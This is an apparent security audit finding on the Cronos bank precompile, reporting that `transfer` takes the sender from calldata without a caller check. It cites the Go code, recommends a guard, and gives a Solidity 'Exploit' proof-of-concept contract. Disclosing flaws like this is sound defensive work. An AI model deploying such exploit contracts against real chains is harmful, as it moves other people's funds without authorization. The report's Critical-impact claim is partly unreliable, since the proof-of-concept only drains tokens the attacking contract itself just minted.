### Title
Unauthorized Arbitrary-Sender Bank Transfer in `BankContract.Run` / `TransferMethodName` — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` case in `BankContract.Run` derives the **denom** from `contract.Caller()` (the calling EVM contract address) but derives the **sender** (the `from` address for `SendCoins`) from attacker-controlled calldata `args[0]`, with no check that `args[0] == contract.Caller()`. Any EVM contract can therefore call the bank precompile's `transfer(victim, attacker, amount)` and drain the victim's `evm/<calling_contract>` native bank balance without the victim's authorization.

---

### Finding Description

In `BankContract.Run`, the `TransferMethodName` branch: [1](#0-0) 

```go
sender := args[0].(common.Address)   // fully attacker-controlled calldata
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
// ...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
// ...
denom := EVMDenom(contract.Caller()) // "evm/<calling_contract>"
``` [2](#0-1) 

```go
if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
```

`from` is taken verbatim from calldata. There is **no guard** of the form `sender == contract.Caller()`. The only guard present is a blocked-address check on the **recipient**, not the sender.

Contrast with `mint`/`burn`, where the denom is also `evm/<contract.Caller()>` — the design ties the denom namespace to the calling contract, but `transfer` then lets that same contract move tokens **out of any holder's account** in that namespace. [3](#0-2) 

The `evm/<address>` denom is a real, spendable native bank denom. A contract that previously called `mint(victim, amount)` (or that victims received tokens from through any path) can later call `transfer(victim, attacker, amount)` to drain those tokens.

---

### Impact Explanation

- **Unauthorized transfer of native bank balance** — falls squarely under the Critical/High impact category: *"Unauthorized transfer of precompile-controlled assets."*
- The victim's `evm/<malicious_contract>` bank balance is permanently reduced; the attacker's balance increases. No victim signature or approval is required.
- `SendCoins` in the Cosmos SDK enforces no per-transfer authorization beyond the caller being a module or having the coins — the precompile bypasses the normal signer check entirely.

---

### Likelihood Explanation

**Precondition:** the victim must hold a non-zero `evm/<attacker_contract>` balance. This is reachable because:

1. The attacker deploys contract M.
2. M calls `mint(victim, amount)` on the bank precompile — this is unrestricted and creates `evm/M` tokens in the victim's native bank account.
3. M then calls `transfer(victim, attacker, amount)` — draining those tokens.

Steps 2 and 3 can be combined in a single transaction. No admin, governance, or victim interaction beyond receiving the minted tokens is required. The attacker is fully unprivileged.

---

### Recommendation

Add a caller-authorization guard at the top of the `TransferMethodName` branch:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer sender must be the calling contract")
}
```

This enforces that a contract can only transfer `evm/<contract>` tokens **from itself**, not from arbitrary holders, which is consistent with the denom-ownership model used by `mint`/`burn`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address token, address account) external view returns (uint256);
}

contract Exploit {
    IBank constant bank = IBank(address(100)); // bankContractAddress = bytes{100}

    function attack(address victim, uint256 amount) external {
        // Step 1: mint evm/<this> tokens to victim (no restriction)
        bank.mint(victim, amount);

        // Step 2: drain victim's evm/<this> balance — sender taken from calldata, no auth check
        bank.transfer(victim, msg.sender, amount);

        // Assert: victim balance == 0, attacker balance == amount
        assert(bank.balanceOf(address(this), victim) == 0);
    }
}
```

Deploy `Exploit`, call `attack(victim, 1e18)`. The victim's `evm/<Exploit>` native bank balance decreases by `1e18` and the attacker's increases by `1e18` — with no victim signature, no allowance, and no admin involvement. [4](#0-3)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L130-131)
```go
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
